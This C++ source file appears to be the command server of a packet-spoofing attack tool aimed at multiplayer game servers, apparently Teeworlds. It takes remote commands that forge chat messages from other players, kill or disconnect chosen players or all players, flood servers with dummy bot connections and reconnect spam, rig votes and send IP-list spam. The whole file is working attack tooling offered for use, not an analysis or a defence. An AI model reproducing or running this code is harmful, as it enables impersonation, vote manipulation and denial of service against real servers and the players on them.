// twspoofer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include "core.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <memory>
#include <string>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#include "conio.h"
#include <ctime>

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "client.h"
#include "networking.h"


DWORD WINAPI UpdateThread(LPVOID lpParam);
DWORD WINAPI WorkingThread(LPVOID lpParam);


Client::Client(int i, SOCKET s)
	: id(i), socket(s)
{
	m_pPacketgen = new Packetgen(this);

	lastAck = TIMEOUT_SEC;
	dummieSpam = 0;
	memset(dummiesIP, 0, sizeof(dummiesIP));
	dummiesPort = 0;

	char aBuf[3];
	sprintf_s(aBuf, sizeof(aBuf), "%d", id);
	send(socket, aBuf);

	handle[Client::UPDATE_THREAD] = CreateThread(NULL, 0,UpdateThread, (LPVOID)this, 0, &thread[Client::UPDATE_THREAD]);
	handle[Client::WORKING_THREAD] = CreateThread(NULL, 0, WorkingThread, (LPVOID)this, 0, &thread[Client::WORKING_THREAD]);
}

Client::~Client()
{
	// terminate all threads
	for(int i = 0; i < Client::NUM_THREADTYPES; i++)
		TerminateThread(handle[i], 0);

	// close socket
	closesocket(socket);
	CloseSocket(this);

	delete m_pPacketgen;
}

//Client *clients[MAX_CLIENTS];

bool restart = false; // setting this to true will instantly shutdown the zervor (use restart skript!)

void Client::Drop(bool dc)
{
	if (m_pPacketgen->GetConnectedDummies() > 0)
		m_pPacketgen->SendDisconnectDummies();
	if(dc)
		printf("Client #%d disconnected\n", id);
	else
		printf("Dropping client #%d\n", id);

	delete this;
}

DWORD WINAPI UpdateThread(LPVOID lpParam)
{
	Client *pSelf = (Client *)lpParam;
	time_t t = time(NULL);

	while(1)
	{
		//if(pSelf->ShouldTerminate())
		//	return;

		if (time(NULL) >= t + 1) //1 sec
		{
			if (pSelf->DoAck() < 1)
			{
				//timeout
				printf("Client #%d timed out (not acked for %i seconds)\n", pSelf->GetID(), TIMEOUT_SEC);
				send(pSelf->GetSocket(), "\x04\x15");
				Sleep(1000);
				pSelf->Drop();		
			}

			pSelf->GetPacketgen()->SendKeepAliveDummies();
			pSelf->GetPacketgen()->SendEmoteDummies(rand()%15); // XXX: random emoticon

			time(&t);
		}

		if(pSelf->dummieSpam > 0)
		{
			// fuck this few milliseconds right here, noone fucking cares man.
			Sleep(100-1);
			pSelf->GetPacketgen()->SendConnectDummies(inet_addr(pSelf->dummiesIP), htons(pSelf->dummiesPort), pSelf->dummieSpam, 0, "verkeckt!");
			Sleep(100);
			pSelf->GetPacketgen()->SendDisconnectDummies("verkeckt!");
		}

		Sleep(2);
	}
}

DWORD WINAPI WorkingThread(LPVOID lpParam)
{
	Client *pSelf = (Client *)lpParam;
	SOCKET g_Client = pSelf->GetSocket();
	int client = pSelf->GetID();

	//printf("Created new thread #%d\n", clientID);

	//id msg and welcome send in one packet, no other idea how to flush the socket to prevent that
	Sleep(250);

	send(g_Client, "[Server]: Connection established! Welcome!");

	while (1)
	{
		char buffer[256] = {0};

		if (recv(g_Client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
		{
			char aCmd[512][256] = { { 0 } };
			memset(&aCmd, 0, sizeof(aCmd));
			int Cmd = 0;
			int Char = 0;

			// split the command to extract the parameters
			for (unsigned int i = 0; i < strlen(buffer); i++)
			{
				if (buffer[i] == ' ')
				{
					Cmd++;
					Char = 0;
					continue;
				}

				aCmd[Cmd][Char] = buffer[i];
				Char++;
			}

			if (strcmp(aCmd[0], "keepalive") == 0 || strcmp(aCmd[0], "\x16") == 0) // keep alive
			{
				send(g_Client, "\x16"); // send back to the client
				pSelf->ResetAck();
			}
			else if (strcmp(aCmd[0], "restart") == 0) // keep alive
			{
				restart = true;
				send(g_Client, "[Server]: Restarting!"); // TODO: send this to all clients!
			}
			else if (strcmp(aCmd[0], "status") == 0) // status
			{
				send(g_Client, "[Server]: Working fine.");
			}
			else if (strcmp(aCmd[0], "fetchips") == 0)
			{
				exec("fetchips.py");
				exec("fixips.exe");
				send(g_Client, "[Server]: Fetching ips ... done");
			}
			else if (strcmp(aCmd[0], "chat") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
				{
					char aMsg[256] = {0};
					for (int i = 5; i <= Cmd; i++)
						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);

					pSelf->GetPacketgen()->SendChat(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])), aMsg);

					send(g_Client, "[Server]: Spoofed chat message sent successfully!");
				}
				else
					send(g_Client, "[Server]: Please use: chat <srcIp> <srcPort> <dstIp> <dstPort> <message>");
			}
			else if (strcmp(aCmd[0], "kill") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					pSelf->GetPacketgen()->SendKill(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));

					send(g_Client, "[Server]: Spoofed kill sent successfully!");
				}
				else
					send(g_Client, "[Server]: Please use: kill <srcIp> <srcPort> <dstIp> <dstPort>");
			}
			else if (strcmp(aCmd[0], "disconnect") == 0 || strcmp(aCmd[0], "dc") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					pSelf->GetPacketgen()->SendDisconnect(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));

					send(g_Client, "[Server]: Spoofed disconnect sent successfully!");
				}
				else
					send(g_Client, "[Server]: Please use: disconnect <srcIp> <srcPort> <dstIp> <dstPort>");
			}
			else if (strcmp(aCmd[0], "dummies") == 0 || strcmp(aCmd[0], "dum") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int number = atoi(aCmd[3]);
					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
					{
						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
						{
							pSelf->GetPacketgen()->SendConnectDummies(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, 0, "SPAß IM LEBEN, YAA!");
							send(g_Client, "[Server]: Dummies connected!");
						}
						else
							send(g_Client, "[Server]: Disconnect active dummies first.");
					}
					else
					{
						char aBuf[64] = {0};
						sprintf_s(aBuf, sizeof(aBuf), "[Server]: Please select a amount between 1 and %i!", MAX_DUMMIES_PER_CLIENT);
						send(g_Client, aBuf);
					}
				}
				else
					send(g_Client, "[Server]: Please use: dummies <dstIp> <dstPort> <amount>");
			}
			else if (strcmp(aCmd[0], "disconnectdummies") == 0 || strcmp(aCmd[0], "dcdummies") == 0 || strcmp(aCmd[0], "dcdum") == 0)
			{
				if (pSelf->GetPacketgen()->GetConnectedDummies() > 0)
				{
					pSelf->GetPacketgen()->SendDisconnectDummies();
					send(g_Client, "[Server]: Dummies disconnected.");
				}
				else
					send(g_Client, "[Server]: Connect dummies.");
			}
			else if (strcmp(aCmd[0], "chatdummies") == 0 || strcmp(aCmd[0], "chatdum") == 0)
			{
				if (aCmd[1][0])
				{
					char aMsg[256] = {0};
					for (int i = 1; i <= Cmd; i++)
					{
						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);
					}

					if (pSelf->GetPacketgen()->GetConnectedDummies() > 0)
					{
						pSelf->GetPacketgen()->SendChatDummies(aMsg);
						send(g_Client, "[Server]: Chatmessage was sent from all dummies!");
					}
					else
						send(g_Client, "[Server]: Connect dummies.");
				}
				else
					send(g_Client, "[Server]: Please use: chatdummies <msg>");
			}
			else if (strcmp(aCmd[0], "dummyspam") == 0 || strcmp(aCmd[0], "ds") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					int number = atoi(aCmd[3]);
					if(pSelf->dummieSpam)
					{
						pSelf->dummieSpam = 0;
						send(g_Client, "[Server]: Dummyspam stopped!");
					}
					else if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
					{
						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
						{
							pSelf->dummieSpam = number;
							sprintf_s(pSelf->dummiesIP, sizeof(pSelf->dummiesIP), aCmd[1]);
							pSelf->dummiesPort = atoi(aCmd[2]);
							send(g_Client, "[Server]: Dummyspam started!");
						}
						else
							send(g_Client, "[Server]: Disconnect active dummies first.");
					}
					else
					{
						char aBuf[64] = {0};
						sprintf_s(aBuf, sizeof(aBuf), "[Server]: Please select a amount between 1 and %i!", MAX_DUMMIES_PER_CLIENT);
						send(g_Client, aBuf);
					}
				}
				else
					send(g_Client, "[Server]: Please use: dummies <dstIp> <dstPort> <amount>");
			}
			else if (strcmp(aCmd[0], "votebot") == 0 || strcmp(aCmd[0], "vb") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
				{
					int number = atoi(aCmd[3]);
					int vote = atoi(aCmd[4]);
					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
					{
						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
						{
							pSelf->GetPacketgen()->SendConnectDummies(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, vote);
							send(g_Client, "[Server]: Dummies connected (voting...)!");
						}
						else
							send(g_Client, "[Server]: Disconnect active dummies first.");
					}
					else
					{
						char aBuf[64] = {0};
						sprintf_s(aBuf, sizeof(aBuf), "[Server]: Please select a amount between 1 and %i!", MAX_DUMMIES_PER_CLIENT);
						send(g_Client, aBuf);
					}
				}
				else
					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>");
			}
			else if (strcmp(aCmd[0], "voteall") == 0 || strcmp(aCmd[0], "va") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					pSelf->GetPacketgen()->SendVoteAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), atoi(aCmd[3]));
					send(g_Client, "[Server]: Votes sent successfully!");
				}
				else
					send(g_Client, "[Server]: Please use: voteall <dstIp> <dstPort> <vote>");
			}
			else if (strcmp(aCmd[0], "ipspam") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0])
				{
					pSelf->GetPacketgen()->SendListIpAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
					send(g_Client, "[Server]: IP-spam sent successfully!");
				}
				else
					send(g_Client, "[Server]: Please use: ipspam <dstIp> <dstPort>");
			}
			else if (strcmp(aCmd[0], "killall") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0])
				{
					pSelf->GetPacketgen()->SendKillAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
					send(g_Client, "[Server]: All players have been killed!");
				}
				else
					send(g_Client, "[Server]: Please use: killall <dstIp> <dstPort>");
			}
			else if (strcmp(aCmd[0], "disconnectall") == 0 || strcmp(aCmd[0], "dcall") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0])
				{
					pSelf->GetPacketgen()->SendDisconnectAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])));
					send(g_Client, "[Server]: All players have been disconnected!");
				}
				else
					send(g_Client, "[Server]: Please use: dcall <dstIp> <dstPort>");
			}
			else if (strcmp(aCmd[0], "chatall") == 0)
			{
				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
				{
					char aMsg[256] = {0};
					for (int i = 3; i <= Cmd; i++)
					{
						sprintf_s(aMsg, sizeof(aMsg), "%s %s", aMsg, aCmd[i]);
					}
					pSelf->GetPacketgen()->SendChatAll(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), aMsg);
					send(g_Client, "[Server]: Chatmessage was sent from all players!");
				}
				else
					send(g_Client, "[Server]: Please use: chatall <dstIp> <dstPort> <msg>");
			}
			else if (strcmp(aCmd[0], "exit") == 0)
			{
				//send(g_Client, "[Server]: Closing thread... Goodbye!");
				send(g_Client, "\x04\x06");
				pSelf->Drop(true);
			}
			else
				send(g_Client, "[Server]: Unknown command.");
		}
		Sleep(1);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	//DWORD Thread;
	WSADATA data;
	SOCKET g_Server, g_Client;
	SOCKADDR_IN info, client_info;
	int client_info_length = sizeof(client_info);
	int clientCount = 0;
	char aBuf[32] = {0};

	printf("Starting...\n");

	srand((unsigned int)time(NULL));

	// WSA
	if (WSAStartup(MAKEWORD(2, 0), &data) != 0)
	{
		printf("Error in WSAStartup(): %i\n", WSAGetLastError());
		return 1;
	}
	
	// Socket
	g_Server = socket(AF_INET, SOCK_STREAM, 0);
	if (g_Server == INVALID_SOCKET)
	{
		printf("Error in socket(): %i", WSAGetLastError());
		
		printf("\n");
		return 1;
	}
	
	// Set socket in non blocking mode
	u_long iMode = 1;
	ioctlsocket(g_Server, FIONBIO, &iMode);
	
	// Info
	int Port = 2016;
inf:
	info.sin_addr.s_addr = INADDR_ANY;
	info.sin_family = AF_INET;
	info.sin_port = htons(Port);
	
	// Bind
	if (bind(g_Server, (struct sockaddr*)&info, sizeof(info)) == SOCKET_ERROR)
	{
		if(WSAGetLastError() == 10048) // see https://msdn.microsoft.com/de-de/library/windows/desktop/ms740668%28v=vs.85%29.aspx
		{
			printf("Port %i already in use!", Port);
			Port += 1000; // for version 2, increment the port by 1000 // For version 1, increment by the port 100
			printf(" Trying next port: %i\n", Port);
			if(Port > 0xFFFF) return 1; // ports exceeded
			goto inf;
		}
		else
		{
			printf("Error in bind(): %i\n", WSAGetLastError());
			return 1;
		}
	}
	if(Port != 2016) printf("-- WARNING: Using alternative Port %i for communication! --\n", Port);

	// Listen
	if (listen(g_Server, 5) == SOCKET_ERROR)
	{
		printf("Error in listen(): %i\n", WSAGetLastError());
		return 1;
	}

	printf("Initialization successful!\n");
	printf("Waiting for clients...\n");

	while (1) // listens for new connection attempts
	{
		if(restart)
			break;

		g_Client = accept(g_Server, (struct sockaddr*)&client_info, &client_info_length);

		if (g_Client != SOCKET_ERROR)
		{
			/*clients[clientCount] = */new Client(clientCount, g_Client);

			printf("Client #%d accepted: %s:%i\n", clientCount, inet_ntoa(client_info.sin_addr), ntohs(client_info.sin_port));

			clientCount++;
		}
		Sleep(2);
	}

	printf("Shutting down!");
	closesocket(g_Server);
	WSACleanup();
	return 0;
}

